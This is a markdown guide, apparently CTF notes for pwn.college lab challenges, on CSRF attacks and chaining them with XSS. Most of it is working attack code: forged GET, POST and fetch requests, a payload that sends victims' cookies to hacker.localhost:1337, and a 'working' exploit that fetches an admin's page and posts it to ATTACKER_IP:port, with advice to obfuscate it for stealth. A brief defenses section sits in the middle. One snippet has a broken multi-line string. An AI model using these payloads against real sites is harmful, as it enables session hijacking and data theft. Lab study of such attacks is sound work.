# CSRF and XSS Chaining Guide

## **Overview**
This document outlines the different types of CSRF (Cross-Site Request Forgery) attacks and how they can be chained with XSS (Cross-Site Scripting) vulnerabilities to amplify the attack's impact.

---

## **1. What is CSRF?**

CSRF is an attack that tricks a victim’s browser into making an unintended request to a target server on behalf of the victim, leveraging their authenticated session.

### **Key Characteristics:**
- Exploits the browser’s automatic inclusion of cookies, sessions, or authentication headers.
- Relies on the victim visiting a malicious website controlled by the attacker.

---

## **2. Types of CSRF**

### **A. Simple GET CSRF**
This type of CSRF leverages a `GET` request to perform actions on the target server.

#### **Example:**
```html
<html>
  <body>
    <script>
      window.location = "http://victim.com/action?param=value";
    </script>
  </body>
</html>
```

#### **How It Works:**
- The victim visits the malicious site.
- The browser sends a `GET` request to the target server, using the victim’s cookies.

---

### **B. POST CSRF**
This type of CSRF forges a `POST` request, which is often used for sensitive actions like form submissions.

#### **Example:**
```html
<html>
  <body>
    <script>
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = 'http://victim.com/submit';

      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = 'param';
      input.value = 'value';
      form.appendChild(input);

      document.body.appendChild(form);
      form.submit();
    </script>
  </body>
</html>
```

#### **How It Works:**
- The victim’s browser submits the form programmatically, sending the payload to the target server.

---

### **C. Advanced CSRF with Headers**
Some applications rely on specific HTTP headers (e.g., `X-Requested-With`) for CSRF protection. Advanced CSRF exploits bypass this by leveraging `XMLHttpRequest` or `fetch`.

#### **Example:**
```html
<html>
  <body>
    <script>
      fetch('http://victim.com/endpoint', {
        method: 'POST',
        credentials: 'include',
        headers: {
          'X-Requested-With': 'XMLHttpRequest'
        },
        body: JSON.stringify({ key: 'value' })
      });
    </script>
  </body>
</html>
```

#### **How It Works:**
- Uses JavaScript to forge the request with custom headers.

---

## **3. CSRF with XSS Chaining**
Chaining CSRF with XSS amplifies the impact by:
- Using XSS to inject malicious scripts.
- Using CSRF to force actions on behalf of an authenticated user.

### **A. XSS to CSRF**
Using XSS to execute CSRF by injecting malicious scripts into a vulnerable application.

#### **Example Payload:**
```html
<script>
  fetch('http://victim.com/submit', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({ key: 'malicious_value' })
  });
</script>
```

#### **How It Works:**
- The attacker injects the script via XSS.
- The script forges a `POST` request to the target server, leveraging the victim’s session.

---

### **B. CSRF to Trigger XSS**
Using CSRF to inject malicious scripts into an application that does not properly sanitize user input.

#### **Example:**
```html
<html>
  <body>
    <script>
      const form = document.createElement('form');
      form.method = 'POST';
      form.action = 'http://victim.com/comment';

      const input = document.createElement('input');
      input.type = 'hidden';
      input.name = 'comment';
      input.value = '<script>alert("PWNED")</script>';
      form.appendChild(input);

      document.body.appendChild(form);
      form.submit();
    </script>
  </body>
</html>
```

#### **How It Works:**
- CSRF injects a payload containing an XSS vector into a form.
- The malicious script executes when the vulnerable application reflects the input.

---

### **C. Chaining XSS with CSRF for Persistence**
Use XSS to insert a persistent CSRF payload into the application, which gets executed later.

#### **Example Payload:**
```html
<script>
  const csrfPayload = '<form method="POST" action="http://victim.com/submit">
    <input type="hidden" name="param" value="value">
  </form>';

  fetch('http://victim.com/comment', {
    method: 'POST',
    credentials: 'include',
    body: JSON.stringify({ comment: csrfPayload })
  });
</script>
```

#### **How It Works:**
- The attacker injects a persistent XSS payload into a comment or input field.
- When another user views the content, the CSRF is triggered.

---

### **D. CSRF to Steal Cookies Using XSS**
Combine CSRF with XSS to exfiltrate cookies such as `auth` and `session` from the target.

#### **Example Payload:**
```html
<html>
  <body>
    <script>
      // Construct the XSS payload to exfiltrate cookies via GET
      const xssPayload = '<script>' +
        'fetch("http://hacker.localhost:1337/log?cookies=" + encodeURIComponent(document.cookie));' +
      '</s' + 'cript>';

      // Construct the target URL with the malicious XSS payload
      const targetURL = 'http://challenge.localhost/ephemeral?msg=' + encodeURIComponent(xssPayload);

      // Redirect the admin's browser to the target URL
      window.location = targetURL;
    </script>
  </body>
</html>
```

#### **How It Works:**
- The CSRF payload injects an XSS vector that sends the victim’s cookies to the attacker’s server (`http://hacker.localhost:1337/log`).
- The attacker receives the `auth` and `session` cookies and can use them to impersonate the victim.

---

## **4. Defenses Against CSRF and XSS**

### **A. CSRF Protections:**
1. **CSRF Tokens:** Require a unique token for every state-changing request.
2. **SameSite Cookies:** Use `SameSite` attributes to prevent cookies from being sent with cross-origin requests.
3. **Referer and Origin Validation:** Check the `Referer` and `Origin` headers to validate request sources.

### **B. XSS Protections:**
1. **Input Validation and Sanitization:**
   - Escape `<`, `>`, `&`, and other special characters.
2. **Content Security Policy (CSP):**
   - Use CSP headers to block inline JavaScript and restrict script sources.
3. **HTTP-Only Cookies:**
   - Prevent JavaScript from accessing sensitive cookies.

---

## **5. Summary**
- CSRF and XSS are powerful vulnerabilities that can be exploited individually or together.
- Understanding the interplay between these attacks allows you to craft sophisticated payloads and better defend applications.
- Always validate inputs, sanitize outputs, and use modern web security features like CSRF tokens and CSP headers.

---
---


## Working CSRF to XSS Payload Example

This example demonstrates chaining a CSRF payload to inject an XSS payload into a vulnerable page, which fetches the admin's challenge page and exfiltrates its contents to an attacker's server.

### HTML Payload
```html
<html>
  <body>
    <script>
      // XSS payload to fetch the page you want via fetch() GET request
      const xssPayload = `<script>
        fetch('http://challenge.localhost/', {
          method: 'GET',
          credentials: 'include' // Include admin cookies
        })
        .then(response => response.text())
        .then(html => {
          // Send the fetched HTML to the attacker's server
          fetch('http://ATTACKER_IP:port', {
            method: 'POST',
            mode: 'no-cors',
            body: html
          });
        })
        .catch(error => {
          // Send error details to the attacker's server
          fetch('http://ATTACKER_IP:port', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({ error: error.message })
          });
        });
      <\/script>`;

      // Redirect user to the vulnerable page with the XSS payload
      const targetURL = 'http://vulnerable-site/page?msg=' + encodeURIComponent(xssPayload);
      window.location = targetURL;
    </script>
  </body>
</html>
```

### How It Works
1. **XSS Execution**: The admin is redirected to the vulnerable site, and the `msg` parameter contains the XSS payload.
2. **Fetching Admin's Page**: The XSS payload fetches the admin's version of `http://challenge.localhost/`.
3. **Exfiltration**: The fetched HTML is sent to the attacker's server via a `POST` request.
4. **Error Handling**: Any errors encountered during the fetch are sent to the attacker's server for debugging.

### Notes
- **Replace Placeholders**: Replace `http://ATTACKER_IP:port` with your server's address.
- **Testing**: Host this payload on your attacker-controlled server and monitor incoming `POST` requests for results.
- **Next Steps**: If the page contains sensitive data, parse the content to extract only relevant details before sending it.

### Enhancements
1. **Filtering Data**:
   ```javascript
   const matches = html.match(/pwn\.college\S*/g) || [];
   fetch('http://ATTACKER_IP:port', {
     method: 'POST',
     mode: 'no-cors',
     body: JSON.stringify({ matches })
   });
   ```
2. **Obfuscation**:
   Use a tool or method to obfuscate the payload for stealth purposes.

---
### Other Examples

CSRF to XSS to call webpage with redirect elements
```html
<html>
  <body>
    <script>
      // Step 1: Create a draft with XSS payload
      const draftForm = document.createElement('form');
      draftForm.method = 'POST';
      draftForm.action = 'http://challenge.localhost/draft';
      draftForm.style.display = 'none';

      // Add content field with XSS payload
      const contentInput = document.createElement('input');
      contentInput.type = 'hidden';
      contentInput.name = 'content';
      contentInput.value = "<script>alert('XSS Triggered')</s"+"cript>";
      draftForm.appendChild(contentInput);

      // Add publish field
      const publishInput = document.createElement('input');
      publishInput.type = 'hidden';
      publishInput.name = 'publish';
      publishInput.value = 'false';
      draftForm.appendChild(publishInput);

      // Append the form to the body and submit it
      document.body.appendChild(draftForm);
      draftForm.submit();

      // Step 2: Redirect to publish after a delay
      setTimeout(() => {
        window.location = 'http://challenge.localhost/publish';
      }, 1000); // 1-second delay to allow draft creation
    </script>
  </body>
</html>
```